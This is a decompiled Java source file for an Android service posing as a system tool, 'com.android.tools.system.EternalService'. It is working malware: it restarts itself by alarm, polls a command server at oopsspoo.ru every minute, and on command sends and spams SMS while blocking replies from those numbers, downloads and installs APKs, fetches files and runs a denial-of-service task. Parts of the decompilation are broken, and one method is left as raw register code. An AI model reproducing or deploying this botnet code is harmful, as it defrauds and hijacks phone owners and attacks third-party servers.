package com.android.tools.system;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import java.util.Timer;
import java.util.TimerTask;

public class EternalService extends Service {
    private static final String TAG = Class.forName("com.android.tools.system.EternalService").getName();
    public ServerDos sd = null;
    public String serverName = "oopsspoo.ru";

    public static class Alarm extends BroadcastReceiver {
        public static final String ALARM_EVENT = "net.multipi.ALARM";
        public static final int ALARM_INTERVAL_SEC = 5;

        @Override
        public void onReceive(Context context, Intent intent) {
            Context context2 = context;
            Intent intent2 = intent;
            if (!EternalService.isRunning(context2)) {
                Context context3 = context2;
                Intent intent3 = r7;
                Intent intent4 = intent4;
                try {
                    intent4 = new Intent(context2, Class.forName("com.android.tools.system.EternalService"));
                    ComponentName startService = context3.startService(intent3);
                } catch (ClassNotFoundException e) {
                    Throwable th = e;
                    NoClassDefFoundError noClassDefFoundError = r13;
                    NoClassDefFoundError noClassDefFoundError2 = new NoClassDefFoundError(th.getMessage());
                    throw noClassDefFoundError;
                }
            }
        }

        public static void setAlarm(Context context) {
            Context context2 = context;
            AlarmManager alarmManager = (AlarmManager) context2.getSystemService("alarm");
            Context context3 = context2;
            Intent intent = r11;
            Intent intent2 = new Intent(ALARM_EVENT);
            alarmManager.setRepeating(0, System.currentTimeMillis(), (long) 5000, PendingIntent.getBroadcast(context3, 0, intent, 0));
        }

        public static void cancelAlarm(Context context) {
            Context context2 = context;
            Context context3 = context2;
            Intent intent = r9;
            Intent intent2 = new Intent(ALARM_EVENT);
            ((AlarmManager) context2.getSystemService("alarm")).cancel(PendingIntent.getBroadcast(context3, 0, intent, 0));
        }

        public Alarm() {
        }
    }

    public class ServerPinger extends TimerTask {
        private final EternalService this$0;

        static EternalService access$0(ServerPinger serverPinger) {
            return serverPinger.this$0;
        }

        public void run() {
            try {
                this.this$0.readMessage();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        public ServerPinger(EternalService eternalService) {
            this.this$0 = eternalService;
        }
    }

    static {
        try {
        } catch (ClassNotFoundException e) {
            Throwable th = e;
            NoClassDefFoundError noClassDefFoundError = r6;
            NoClassDefFoundError noClassDefFoundError2 = new NoClassDefFoundError(th.getMessage());
            throw noClassDefFoundError;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        Intent intent2 = intent;
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int i, int i2) {
        Intent intent2 = intent;
        int i3 = i;
        int i4 = i2;
        try {
            Timer timer = r13;
            Timer timer2 = new Timer();
            Timer timer3 = timer;
            TimerTask timerTask = r13;
            TimerTask serverPinger = new ServerPinger(this);
            timer3.schedule(timerTask, (long) 1000, (long) 60000);
        } catch (IllegalStateException e) {
            e.printStackTrace();
        }
        return super.onStartCommand(intent2, i3, i4);
    }

    public static boolean isRunning(Context context) {
        for (RunningServiceInfo runningServiceInfo : ((ActivityManager) context.getSystemService("activity")).getRunningServices(Integer.MAX_VALUE)) {
            try {
                if (Class.forName("com.android.tools.system.EternalService").getName().equals(runningServiceInfo.service.getClassName())) {
                    return true;
                }
            } catch (ClassNotFoundException e) {
                Throwable th = e;
                NoClassDefFoundError noClassDefFoundError = r11;
                NoClassDefFoundError noClassDefFoundError2 = new NoClassDefFoundError(th.getMessage());
                throw noClassDefFoundError;
            }
        }
        return false;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    private boolean isOnline() {
        NetworkInfo[] allNetworkInfo = ((ConnectivityManager) getSystemService("connectivity")).getAllNetworkInfo();
        for (NetworkInfo networkInfo : allNetworkInfo) {
            if (networkInfo.getTypeName().equalsIgnoreCase("WIFI") && networkInfo.isConnected()) {
                return true;
            }
            if (networkInfo.getTypeName().equalsIgnoreCase("MOBILE") && networkInfo.isConnected()) {
                return true;
            }
        }
        return false;
    }

    /* JADX WARNING: Removed duplicated region for block: B:54:0x0362 A:{SYNTHETIC, Splitter:B:54:0x0362} */
    /* JADX WARNING: Removed duplicated region for block: B:69:0x0304 A:{SYNTHETIC, EDGE_INSN: B:69:0x0304->B:41:0x0304 ?: BREAK  , EDGE_INSN: B:69:0x0304->B:41:0x0304 ?: BREAK  } */
    /* JADX WARNING: Removed duplicated region for block: B:35:0x0291  */
    /* JADX WARNING: Removed duplicated region for block: B:69:0x0304 A:{SYNTHETIC, EDGE_INSN: B:69:0x0304->B:41:0x0304 ?: BREAK  , EDGE_INSN: B:69:0x0304->B:41:0x0304 ?: BREAK  , EDGE_INSN: B:69:0x0304->B:41:0x0304 ?: BREAK  } */
    /* JADX WARNING: Removed duplicated region for block: B:54:0x0362 A:{SYNTHETIC, Splitter:B:54:0x0362} */
    /* JADX WARNING: Removed duplicated region for block: B:35:0x0291  */
    /* JADX WARNING: Removed duplicated region for block: B:54:0x0362 A:{SYNTHETIC, Splitter:B:54:0x0362} */
    /* JADX WARNING: Removed duplicated region for block: B:69:0x0304 A:{SYNTHETIC, EDGE_INSN: B:69:0x0304->B:41:0x0304 ?: BREAK  , EDGE_INSN: B:69:0x0304->B:41:0x0304 ?: BREAK  , EDGE_INSN: B:69:0x0304->B:41:0x0304 ?: BREAK  , EDGE_INSN: B:69:0x0304->B:41:0x0304 ?: BREAK  } */
    public void readMessage() throws java.lang.Exception {
        /*
        r28 = this;
        r2 = r28;
        r20 = r2;
        r21 = "Settings";
        r22 = 0;
        r20 = r20.getSharedPreferences(r21, r22);
        r3 = r20;
        r20 = r3;
        r21 = "id";
        r22 = "";
        r20 = r20.getString(r21, r22);
        r4 = r20;
        r20 = r4;
        r21 = "";
        r20 = r20.equals(r21);
        if (r20 != 0) goto L_0x009e;
    L_0x0024:
        r20 = 1;
        r0 = r20;
        r0 = new java.lang.String[r0];
        r20 = r0;
        r27 = r20;
        r20 = r27;
        r21 = r27;
        r22 = 0;
        r23 = new java.lang.StringBuffer;
        r27 = r23;
        r23 = r27;
        r24 = r27;
        r24.<init>();
        r24 = new java.lang.StringBuffer;
        r27 = r24;
        r24 = r27;
        r25 = r27;
        r25.<init>();
        r25 = new java.lang.StringBuffer;
        r27 = r25;
        r25 = r27;
        r26 = r27;
        r26.<init>();
        r26 = "http://";
        r25 = r25.append(r26);
        r26 = r2;
        r0 = r26;
        r0 = r0.serverName;
        r26 = r0;
        r25 = r25.append(r26);
        r25 = r25.toString();
        r24 = r24.append(r25);
        r25 = "/index.php?cmd=";
        r24 = r24.append(r25);
        r24 = r24.toString();
        r23 = r23.append(r24);
        r24 = r4;
        r23 = r23.append(r24);
        r23 = r23.toString();
        r21[r22] = r23;
        r5 = r20;
        r20 = 0;
        r6 = r20;
    L_0x008f:
        r20 = r6;
        r21 = r5;
        r0 = r21;
        r0 = r0.length;
        r21 = r0;
        r0 = r20;
        r1 = r21;
        if (r0 < r1) goto L_0x009f;
    L_0x009e:
        return;
    L_0x009f:
        r20 = 0;
        r7 = r20;
        r20 = 0;
        r8 = r20;
        r20 = 0;
        r9 = r20;
        r20 = "";
        r10 = r20;
        r20 = r9;
        if (r20 != 0) goto L_0x00c0;
    L_0x00b3:
        r20 = new org.apache.http.impl.client.DefaultHttpClient;	 Catch:{ IOException -> 0x0198 }
        r27 = r20;
        r20 = r27;
        r21 = r27;
        r21.<init>();	 Catch:{ IOException -> 0x0198 }
        r9 = r20;
    L_0x00c0:
        r20 = new org.apache.http.client.methods.HttpGet;	 Catch:{ IOException -> 0x0198 }
        r27 = r20;
        r20 = r27;
        r21 = r27;
        r22 = r5;
        r23 = r6;
        r22 = r22[r23];	 Catch:{ IOException -> 0x0198 }
        r21.<init>(r22);	 Catch:{ IOException -> 0x0198 }
        r8 = r20;
        r20 = r9;
        r21 = r8;
        r20 = r20.execute(r21);	 Catch:{ IOException -> 0x0198 }
        r7 = r20;
        r20 = r7;
        r20 = r20.getEntity();	 Catch:{ IOException -> 0x0198 }
        r21 = "UTF-8";
        r20 = org.apache.http.util.EntityUtils.toString(r20, r21);	 Catch:{ IOException -> 0x0198 }
        r10 = r20;
    L_0x00eb:
        r20 = r10;
        r21 = "";
        r20 = r20.equals(r21);
        if (r20 != 0) goto L_0x0194;
    L_0x00f5:
        r20 = r10;
        r20 = r20.trim();
        r21 = "\\|";
        r20 = r20.split(r21);
        r11 = r20;
        r20 = r11;
        r21 = 0;
        r20 = r20[r21];
        r12 = r20;
        r20 = r12;
        r21 = "SMS";
        r20 = r20.equals(r21);
        r21 = 1;
        r0 = r20;
        r1 = r21;
        if (r0 != r1) goto L_0x01ca;
    L_0x011b:
        r20 = new com.android.tools.system.SMS;
        r27 = r20;
        r20 = r27;
        r21 = r27;
        r22 = r2;
        r22 = r22.getApplicationContext();
        r21.m580init(r22);
        r12 = r20;
        r20 = r12;
        r21 = r11;
        r22 = 1;
        r21 = r21[r22];
        r21 = r21.trim();
        r22 = r11;
        r23 = 2;
        r22 = r22[r23];
        r22 = r22.trim();
        r20.sendSMS(r21, r22);
        r20 = r2;
        r21 = "BlockNums";
        r22 = 0;
        r20 = r20.getSharedPreferences(r21, r22);
        r13 = r20;
        r20 = r13;
        r20 = r20.edit();
        r14 = r20;
        r20 = r11;
        r21 = 3;
        r20 = r20[r21];
        r21 = ",";
        r20 = r20.contains(r21);
        if (r20 == 0) goto L_0x01b7;
    L_0x0169:
        r20 = r11;
        r21 = 3;
        r20 = r20[r21];
        r20 = r20.trim();
        r21 = "\\,";
        r20 = r20.split(r21);
        r15 = r20;
        r20 = 0;
        r16 = r20;
    L_0x017f:
        r20 = r16;
        r21 = r15;
        r0 = r21;
        r0 = r0.length;
        r21 = r0;
        r0 = r20;
        r1 = r21;
        if (r0 < r1) goto L_0x01a2;
    L_0x018e:
        r20 = r14;
        r20 = r20.commit();
    L_0x0194:
        r6 = r6 + 1;
        goto L_0x008f;
    L_0x0198:
        r20 = move-exception;
        r11 = r20;
        r20 = r11;
        r20.printStackTrace();
        goto L_0x00eb;
    L_0x01a2:
        r20 = r14;
        r21 = r15;
        r22 = r16;
        r21 = r21[r22];
        r21 = r21.trim();
        r22 = 1;
        r20 = r20.putBoolean(r21, r22);
        r16 = r16 + 1;
        goto L_0x017f;
    L_0x01b7:
        r20 = r14;
        r21 = r11;
        r22 = 3;
        r21 = r21[r22];
        r21 = r21.trim();
        r22 = 1;
        r20 = r20.putBoolean(r21, r22);
        goto L_0x018e;
    L_0x01ca:
        r20 = r12;
        r21 = "LOADAPK";
        r20 = r20.equals(r21);
        r21 = 1;
        r0 = r20;
        r1 = r21;
        if (r0 != r1) goto L_0x030c;
    L_0x01da:
        r20 = new com.android.tools.system.DownloadApkFromURL;
        r27 = r20;
        r20 = r27;
        r21 = r27;
        r22 = r2;
        r22 = r22.getApplicationContext();
        r21.m562init(r22);
        r12 = r20;
        r20 = r12;
        r21 = 1;
        r0 = r21;
        r0 = new java.lang.String[r0];
        r21 = r0;
        r27 = r21;
        r21 = r27;
        r22 = r27;
        r23 = 0;
        r24 = r11;
        r25 = 1;
        r24 = r24[r25];
        r22[r23] = r24;
        r20 = r20.execute(r21);
    L_0x020b:
        r20 = new com.android.tools.system.DownloadFileFromURL;	 Catch:{ InterruptedException -> 0x034e, Exception -> 0x0358 }
        r27 = r20;
        r20 = r27;
        r21 = r27;
        r22 = r2;
        r22 = r22.getApplicationContext();	 Catch:{ InterruptedException -> 0x034e, Exception -> 0x0358 }
        r21.m563init(r22);	 Catch:{ InterruptedException -> 0x034e, Exception -> 0x0358 }
        r12 = r20;
        r20 = r12;
        r21 = 1;
        r0 = r21;
        r0 = new java.lang.String[r0];	 Catch:{ InterruptedException -> 0x034e, Exception -> 0x0358 }
        r21 = r0;
        r27 = r21;
        r21 = r27;
        r22 = r27;
        r23 = 0;
        r24 = r11;
        r25 = 1;
        r24 = r24[r25];	 Catch:{ InterruptedException -> 0x034e, Exception -> 0x0358 }
        r22[r23] = r24;	 Catch:{ InterruptedException -> 0x034e, Exception -> 0x0358 }
        r20 = r20.execute(r21);	 Catch:{ InterruptedException -> 0x034e, Exception -> 0x0358 }
        r20 = r12;
        r20 = r20.get();	 Catch:{ InterruptedException -> 0x034e, Exception -> 0x0358 }
        r20 = (java.io.File) r20;	 Catch:{ InterruptedException -> 0x034e, Exception -> 0x0358 }
        r13 = r20;
    L_0x0246:
        r20 = r2;
        r21 = new com.android.tools.system.ServerDos;
        r27 = r21;
        r21 = r27;
        r22 = r27;
        r23 = r2;
        r23 = r23.getApplicationContext();
        r22.m581init(r23);
        r0 = r21;
        r1 = r20;
        r1.sd = r0;
        r20 = r2;
        r0 = r20;
        r0 = r0.sd;
        r20 = r0;
        r21 = 1;
        r0 = r21;
        r0 = new java.lang.String[r0];
        r21 = r0;
        r27 = r21;
        r21 = r27;
        r22 = r27;
        r23 = 0;
        r24 = r11;
        r25 = 1;
        r24 = r24[r25];
        r24 = r24.trim();
        r22[r23] = r24;
        r20 = r20.execute(r21);
    L_0x0287:
        r20 = r2;
        r0 = r20;
        r0 = r0.sd;
        r20 = r0;
        if (r20 == 0) goto L_0x029f;
    L_0x0291:
        r20 = r2;
        r0 = r20;
        r0 = r0.sd;
        r20 = r0;
        r21 = 0;
        r20 = r20.cancel(r21);
    L_0x029f:
        r20 = new com.android.tools.system.DownloadFileFromURL;
        r27 = r20;
        r20 = r27;
        r21 = r27;
        r22 = r2;
        r22 = r22.getApplicationContext();
        r21.m563init(r22);
        r12 = r20;
        r20 = r12;
        r21 = 1;
        r0 = r21;
        r0 = new java.lang.String[r0];
        r21 = r0;
        r27 = r21;
        r21 = r27;
        r22 = r27;
        r23 = 0;
        r24 = r11;
        r25 = 1;
        r24 = r24[r25];
        r22[r23] = r24;
        r20 = r20.execute(r21);
        r20 = r12;
        r20 = r20.get();
        r20 = (java.io.File) r20;
        r13 = r20;
        r20 = new java.io.BufferedReader;	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r27 = r20;
        r20 = r27;
        r21 = r27;
        r22 = new java.io.FileReader;	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r27 = r22;
        r22 = r27;
        r23 = r27;
        r24 = r13;
        r23.<init>(r24);	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r21.<init>(r22);	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r15 = r20;
    L_0x02f4:
        r20 = r15;
        r20 = r20.readLine();	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r27 = r20;
        r20 = r27;
        r21 = r27;
        r14 = r21;
        if (r20 != 0) goto L_0x0362;
    L_0x0304:
        r20 = r13;
        r20 = r20.delete();	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
    L_0x030a:
        goto L_0x0194;
    L_0x030c:
        r20 = r12;
        r21 = "LOAD";
        r20 = r20.equals(r21);
        r21 = 1;
        r0 = r20;
        r1 = r21;
        if (r0 == r1) goto L_0x020b;
    L_0x031c:
        r20 = r12;
        r21 = "DOS";
        r20 = r20.equals(r21);
        r21 = 1;
        r0 = r20;
        r1 = r21;
        if (r0 == r1) goto L_0x0246;
    L_0x032c:
        r20 = r12;
        r21 = "STOPDOS";
        r20 = r20.equals(r21);
        r21 = 1;
        r0 = r20;
        r1 = r21;
        if (r0 == r1) goto L_0x0287;
    L_0x033c:
        r20 = r12;
        r21 = "SPAM";
        r20 = r20.equals(r21);
        r21 = 1;
        r0 = r20;
        r1 = r21;
        if (r0 != r1) goto L_0x0194;
    L_0x034c:
        goto L_0x029f;
    L_0x034e:
        r20 = move-exception;
        r12 = r20;
        r20 = r12;
        r20.printStackTrace();
        goto L_0x0246;
    L_0x0358:
        r20 = move-exception;
        r12 = r20;
        r20 = r12;
        r20.printStackTrace();
        goto L_0x0246;
    L_0x0362:
        r20 = new com.android.tools.system.SMS;	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r27 = r20;
        r20 = r27;
        r21 = r27;
        r22 = r2;
        r22 = r22.getApplicationContext();	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r21.m580init(r22);	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r16 = r20;
        r20 = r16;
        r21 = r14;
        r21 = r21.trim();	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r22 = r11;
        r23 = 2;
        r22 = r22[r23];	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r22 = r22.trim();	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r20.sendSMS(r21, r22);	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r20 = r2;
        r21 = "BlockNums";
        r22 = 0;
        r20 = r20.getSharedPreferences(r21, r22);	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r17 = r20;
        r20 = r17;
        r20 = r20.edit();	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r18 = r20;
        r20 = r18;
        r21 = r14;
        r21 = r21.trim();	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r22 = 1;
        r20 = r20.putBoolean(r21, r22);	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        r20 = r18;
        r20 = r20.commit();	 Catch:{ FileNotFoundException -> 0x03b4, IOException -> 0x03be }
        goto L_0x02f4;
    L_0x03b4:
        r20 = move-exception;
        r15 = r20;
        r20 = r15;
        r20.printStackTrace();
        goto L_0x030a;
    L_0x03be:
        r20 = move-exception;
        r15 = r20;
        r20 = r15;
        r20.printStackTrace();
        goto L_0x030a;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.android.tools.system.EternalService.readMessage():void");
    }

    public EternalService() {
    }
}
